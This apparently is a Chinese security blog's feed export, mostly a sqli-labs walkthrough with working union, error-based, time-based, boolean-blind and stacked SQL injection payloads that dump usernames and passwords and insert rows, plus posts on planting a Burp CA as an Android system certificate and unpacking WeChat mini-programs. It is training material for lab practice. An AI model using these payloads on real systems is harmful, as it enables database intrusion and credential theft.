<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090149038.png" alt="image-20221201090149038"></p>
<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>正常访问</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090445372.png" alt="image-20221201090445372"></p>
<p>判断是否存在注入,加一个单引号</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201092238575.png" alt="image-20221201092238575"></p>
<p>根据报错信息,可以得到SQL语句直接拼接的参数值,且为单引号闭合</p>
<p>SQL语句大概为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>



<h5 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; order by n --+</span><br></pre></td></tr></table></figure>

<p>当n&#x3D;3时正常,当n&#x3D;4是报错,所以列数为3</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094042684.png" alt="image-20221201094042684"></p>
<h5 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094307453.png" alt="image-20221201094307453"></p>
<p>页面没有发生改变,因为这个查询会查询出两行结果,但是这个php文件中只返回一行结果,所以应构造出union左边无结果,可以将id改为-1或者一个极大值,最后url应该为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.59.137:8715/sqli/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201094710277.png" alt="image-20221201094710277"></p>
<p>2,3即为显示位,可以在2,3的地方替换成我们想要查询的句子,结果会返回到2,3的位置</p>
<h5 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><p>group_concat():函数返回一个字符串结果,该结果由分组中的值连接组合而成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104649116.png" alt="image-20221201104649116"></p>
<h5 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201104916342.png" alt="image-20221201104916342"></p>
<h5 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105043018.png" alt="image-20221201105043018"></p>
<h5 id="获取列中的数据"><a href="#获取列中的数据" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,(select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201105401601.png" alt="image-20221201105401601"></p>
<h3 id="2-3-2-报错注入"><a href="#2-3-2-报错注入" class="headerlink" title="2.3.2 报错注入"></a>2.3.2 报错注入</h3><h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><p>在MySQL中,报错注入就是指通过页面报出的错误信息,构造合适的语句来获取想要的数据,应用系统没有处理SQL语句错误直接回显到页面上时,即可使用报错注入,报错注入常用的函数是updatexml()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(XML_document,XPath_string,new_value)</span><br></pre></td></tr></table></figure>

<p>XML_document:String格式,为XML文档对象的名称</p>
<p>XPath_string:XPath格式的字符串</p>
<p>new_value:String格式,替换查找到符合条件的数据</p>
<p>报错注入基本语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><strong>0x7e</strong>表示的是~符号,这个符号在XPath语法中是不存在的,因此可以报错,同理,其他在XPath语法中不存在的也可以造成报错,例如!在16进制中为<strong>0x21</strong></p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120119594.png" alt="image-20221201120119594"></p>
<h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,报错,但是没有显示位,所以可以选择报错注入</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201120756406.png" alt="image-20221201120756406"></p>
<p>SQL语句为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>

<h5 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121516972.png" alt="image-20221201121516972"></p>
<h5 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121706270.png" alt="image-20221201121706270"></p>
<h5 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201121850810.png" alt="image-20221201121850810"></p>
<h5 id="获取列中的数据-1"><a href="#获取列中的数据-1" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201122637232.png" alt="image-20221201122637232"></p>
<p>此时数据并没有完全爆出,因为一次只能爆出32个字符,这里字符大于32,需要使用到substring()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substring(string,position,length)</span><br></pre></td></tr></table></figure>

<p>string:指需要截取的原字符串</p>
<p>position:指从哪个位置开始截取字符串,从1开始,为负数时从右往左数</p>
<p>length:指需要截取的长度</p>
<p>所以我们的句子可以改成这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password) from users),1,32),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p>可以通过修改position的值得到全部数据</p>
<h3 id="2-3-3-延时注入"><a href="#2-3-3-延时注入" class="headerlink" title="2.3.3 延时注入"></a>2.3.3 延时注入</h3><h4 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h4><p>延时注入是在我们构造语句之后,通过页面的响应时间来判断正确的数据,当页面无回显时,可以构造延时语句进行注入</p>
<p>延时主要用的函数为<strong>if()<strong>和</strong>sleep()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>

<p>如果expr1的值为TRUE,则if的返回值为expr2,否则为expr3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(1=1,999,666)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124213175.png" alt="image-20221201124213175"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep(n)</span><br></pre></td></tr></table></figure>

<p>n表示延迟的秒数</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124337650.png" alt="image-20221201124337650"></p>
<h4 id="注入方法-2"><a href="#注入方法-2" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,页面无变化,使用延时函数成功延时</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201124943294.png" alt="image-20221201124943294"></p>
<p>SQL语句为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = &#x27;1&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>

<h5 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if((length(database())=1),sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>如果数据库的长度为1,则会延时两秒,可以通过页面返回的延时时间获取到正确的数据库长度</p>
<p>当判断到数据库长度为8时,响应延时了2秒,证明数据库长度为8</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201130219446.png" alt="image-20221201130219446"></p>
<h5 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring(database(),1,1))=1,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>数据库名由26个字母(区分大小写)和0-9个自然数加上下划线组成,相应的ascii码值为48-57、65-90、97-122、95,可以通过页面的响应时间判断数据库的第一个字符的ascii码值,再参照ascii码对照表得到数据库名的第一个字符,剩下的字符同理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring(database(),1,1))=115,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>延时2秒,证明ascii码值为115,对应的字符为s,则数据库第一个字符为s</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201131654510.png" alt="image-20221201131654510"></p>
<h5 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到101时,延时2秒,第一个表的表名第一个字符的ascii码值为101,即为e</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(2),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201132325990.png" alt="image-20221201132325990"></p>
<h5 id="获取列名-2"><a href="#获取列名-2" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=1,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到85时,延时2秒,第一个列的列名第一个字符的ascii码值为85,即为U</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=85,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201133754247.png" alt="image-20221201133754247"></p>
<h5 id="获取列中的数据-2"><a href="#获取列中的数据-2" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><p>获取到的列名为USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
<p>现在获取username中的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select username from users limit 0,1),1,1))=1,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到68时,延时2秒,第一个列的列名第一个字符的ascii码值为68,即为D</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if(ascii(substring((select username from users limit 0,1),1,1))=68,sleep(2),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201135543278.png" alt="image-20221201135543278"></p>
<h3 id="2-3-4-布尔盲注"><a href="#2-3-4-布尔盲注" class="headerlink" title="2.3.4 布尔盲注"></a>2.3.4 布尔盲注</h3><h4 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h4><p>布尔(boolean)型是在计算机中的一种数据类型,只有True(真)和False(假)两个值,一般也称为逻辑性,当页面回显存在真和假两种情况时,可以使用布尔盲注</p>
<p><strong>和延时注入的区别:</strong></p>
<p>页面无任何变化的注入点,只能通过时间来判断是否执行了SQL语句的情况下使用延时注入,存在真假两种情况的注入点可以使用布尔盲注,效率比延时注入更高</p>
<h4 id="注入方法-3"><a href="#注入方法-3" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="判断注入点-3"><a href="#判断注入点-3" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>加单引号,无报错信息,无数据,使用布尔盲注</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201145511630.png" alt="image-20221201145511630"></p>
<h5 id="判断数据库长度-1"><a href="#判断数据库长度-1" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到8时,返回正常界面,即数据库长度为8</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151409609.png" alt="image-20221201151409609"></p>
<h5 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ascii(substring(database(),1,1))=115 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到115时,返回正常界面,即数据库第一个字母的ascii码值为115,即为s</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201151820419.png" alt="image-20221201151820419"></p>
<h5 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and (ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到101时,返回正常界面,即第一个表名的第一个字符的ascii码值为101,即为e</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201153918305.png" alt="image-20221201153918305"></p>
<h5 id="获取列名-3"><a href="#获取列名-3" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=85 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到85时,返回正常界面,第一个列的列名第一个字符的ascii码值为85,即为U</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160710682.png" alt="image-20221201160710682"></p>
<h5 id="获取列中的数据-3"><a href="#获取列中的数据-3" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><p>获取到的列名为USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
<p>现在获取username中的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ascii(substring((select username from users limit 0,1),1,1))=68 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到68时,返回正常界面,第一个列的列名第一个字符的ascii码值为68,即为D</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160901890.png" alt="image-20221201160901890"></p>
<h3 id="2-3-5-堆叠查询"><a href="#2-3-5-堆叠查询" class="headerlink" title="2.3.5 堆叠查询"></a>2.3.5 堆叠查询</h3><h4 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h4><p>堆叠注入是指执行多条SQL语句,在MySQL中,每一条语句后加;表示语句结束,我们就可以多条语句一起执行,但是只有PHP使用<strong>mysqli_multi_query</strong>函数时,才能造成堆叠查询</p>
<p><strong>和联合查询的区别:</strong></p>
<p>联合查询可以执行的句子是有限的,堆叠查询可以执行任意语句,但是这种注入方式不是十分完美的,在web系统中,代码通常只返回一个查询结果,因此堆叠注入第二条语句产生的错误或结果只能被忽略,在前端是无法看到返回结果的,因此在读取数据时,建议使用联合查询,同时在使用堆叠注入之前,我们也是需要知道一些数据库信息的,例如表名、列名</p>
<h4 id="注入方法-4"><a href="#注入方法-4" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;insert into users(id,username,password) values (999,&#x27;test&#x27;,&#x27;test&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215145633.png" alt="image-20221203215145633"></p>
<p>此时查看id&#x3D;999,数据已经成功被添加</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215212251.png" alt="image-20221203215212251"></p>
<p>因为一般是看不到回显的,所以建议配合dnslog带出数据</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓7安装Burp证书</title>
    <url>//blogs/Android_Burp/</url>
    <content><![CDATA[<p>​	在测试Android app时，手机已经安装了burpsuite证书，但是app仍然无法访问https网络，浏览器可以访问http，https会提示此证书并非来自被信任的机构，原因是安卓7及安卓7以上的版本，在手机上安装证书是不被认可的，需要安装系统证书，步骤如下（以夜神模拟器为例）：</p>
<h2 id="1-开启开发者选项"><a href="#1-开启开发者选项" class="headerlink" title="1.开启开发者选项"></a>1.开启开发者选项</h2><p>首先打开设置，拉到最下面有<strong>关于平板电脑</strong></p>
<p><img src="/../images/%E5%AE%89%E5%8D%937%E5%AE%89%E8%A3%85burp%E8%AF%81%E4%B9%A6/image-20230301105444018.png" alt="image-20230301105444018"></p>
<p>进入关于平板电脑之后，再拉到最下面<strong>版本号</strong>，连续点击五次即可唤醒开发者选项</p>
<p><img src="/../images/%E5%AE%89%E5%8D%937%E5%AE%89%E8%A3%85burp%E8%AF%81%E4%B9%A6/image-20230301105634497.png" alt="image-20230301105634497"></p>
<p>然后返回上一级，即可看到<strong>开发者选项</strong></p>
<p><img src="/../images/%E5%AE%89%E5%8D%937%E5%AE%89%E8%A3%85burp%E8%AF%81%E4%B9%A6/image-20230301105708213.png" alt="image-20230301105708213"></p>
<p>打开USB调试</p>
<p><img src="/../images/%E5%AE%89%E5%8D%937%E5%AE%89%E8%A3%85burp%E8%AF%81%E4%B9%A6/image-20230301105744766.png" alt="image-20230301105744766"></p>
<h2 id="2-使用adb连接模拟器"><a href="#2-使用adb连接模拟器" class="headerlink" title="2.使用adb连接模拟器"></a>2.使用adb连接模拟器</h2><p>打开夜神模拟器的安装目录，安装目录中自带adb，在当前目录唤醒cmd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\Program Files\Nox\bin&gt;adb version</span><br><span class="line">Android Debug Bridge version 1.0.36</span><br><span class="line">Revision 0e9850346394-android</span><br></pre></td></tr></table></figure>

<p>用adb进行连接（夜神模拟器的默认端口为62001）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\Program Files\Nox\bin&gt;adb connect 127.0.0.1:62001</span><br><span class="line">already connected to 127.0.0.1:62001</span><br></pre></td></tr></table></figure>

<p>如果不知道模拟器的端口，例如多开模拟器，可以在配置文件中查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\Program Files\Nox\bin\BignoxVMS\要连接的模拟器\Nox_1.vbox</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%AE%89%E5%8D%937%E5%AE%89%E8%A3%85burp%E8%AF%81%E4%B9%A6/image-20230301110845410.png" alt="image-20230301110845410"></p>
<p>查看是否连接成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\Program Files\Nox\bin&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62001 device</span><br></pre></td></tr></table></figure>

<h2 id="3-安装系统证书"><a href="#3-安装系统证书" class="headerlink" title="3.安装系统证书"></a>3.安装系统证书</h2><p>首先导出burp证书</p>
<p><img src="/../images/%E5%AE%89%E5%8D%937%E5%AE%89%E8%A3%85burp%E8%AF%81%E4%B9%A6/image-20230301111146264.png" alt="image-20230301111146264"></p>
<p>使用openssl将der格式转为pem格式，方便安卓识别</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ openssl x509 -inform DER -in cacert.der -out cacert.pem #转为pem格式</span><br><span class="line">                                                                                                                                                                                     </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ mv cacert.pem `openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1`&#x27;.0&#x27; #重命名为&lt;hash值&gt;.0</span><br></pre></td></tr></table></figure>

<p>然后在adb中操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\Program Files\Nox\bin&gt;adb root</span><br><span class="line"></span><br><span class="line">D:\Program Files\Nox\bin&gt;adb remount</span><br><span class="line">remount succeeded</span><br><span class="line"></span><br><span class="line">D:\Program Files\Nox\bin&gt;adb push &quot;9a5ba575.0&quot; /sdcard/</span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] /sdcard/9a5ba575.0</span></span><br><span class="line"></span><br><span class="line">D:\Program Files\Nox\bin&gt;adb shell</span><br><span class="line">dream2lteks:/ # mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/</span><br><span class="line">dream2lteks:/ # chmod 644 /system/etc/security/cacerts/9a5ba575.0</span><br></pre></td></tr></table></figure>

<p>重启手机即可看到证书，正常抓包</p>
<p><img src="/../images/%E5%AE%89%E5%8D%937%E5%AE%89%E8%A3%85burp%E8%AF%81%E4%B9%A6/image-20230301111803737.png" alt="image-20230301111803737"></p>
]]></content>
      <tags>
        <tag>burp</tag>
        <tag>安卓7</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译方法</title>
    <url>//blogs/wxapp_decompile/</url>
    <content><![CDATA[<h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h1><p>nodejs:<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p>
<p>wxappUnpacker:<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p>
<p>夜神模拟器6.6.1.1:<a href="https://support.yeshen.com/zh-CN/win-release">https://support.yeshen.com/zh-CN/win-release</a></p>
<p>微信8.0.24(32位):<a href="https://weixin.qq.com/">https://weixin.qq.com/</a></p>
<p>文件管理器</p>
<h1 id="2-反编译微信小程序"><a href="#2-反编译微信小程序" class="headerlink" title="2.反编译微信小程序"></a>2.反编译微信小程序</h1><h2 id="2-1-删除多余小程序包"><a href="#2-1-删除多余小程序包" class="headerlink" title="2.1 删除多余小程序包"></a>2.1 删除多余小程序包</h2><p>为了避免小程序包太多,先用文件管理器把小程序的包全部删除完</p>
<p>存放小程序包的路径为</p>
<p>&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;{User哈希值}&#x2F;appbrand&#x2F;pkg</p>
<p>如果有多个user哈希值的目录,不清楚哪个是当前登录账号的目录,可以随便打开一个小程序,然后进入文件管理器按照时间排序,最近修改的文件夹基本上就是当前登录账号的文件夹了</p>
<p>将文件夹内的内容全部删除</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204161559427.png" alt="image-20221204161559427"></p>
<h2 id="2-2-获取小程序包"><a href="#2-2-获取小程序包" class="headerlink" title="2.2 获取小程序包"></a>2.2 获取小程序包</h2><p>手机进入小程序,会在对应目录生成几个包,包大致分为三种:基础包、主包、分包,基础包一般内存最大,主包其次,最小的是分包</p>
<p>用微信打开小程序,然后返回小程序包存放目录查看</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162000740.png" alt="image-20221204162000740"></p>
<p>将包保存到电脑上,模拟器有文件传输助手,将文件移动到指定目录即可移动到电脑上</p>
